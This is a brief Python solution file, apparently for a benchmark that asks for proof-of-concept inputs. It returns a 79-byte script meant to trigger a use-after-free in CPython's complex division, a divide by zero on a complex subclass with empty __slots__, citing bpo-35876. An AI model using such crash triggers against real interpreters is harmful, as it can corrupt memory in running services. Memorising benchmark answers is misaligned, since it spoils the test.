import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generates a Python script that triggers the UAF in compound division by zero (bpo-35876)
        # The specific pattern involves a subclass of complex with __slots__
        # Length matches the ground truth of 79 bytes
        poc = (
            "class X(complex):\n"
            "    __slots__ = ()\n"
            "x = X()\n"
            "try:\n"
            "    x /= 0\n"
            "except:\n"
            "    pass\n"
        )
        return poc.encode('utf-8')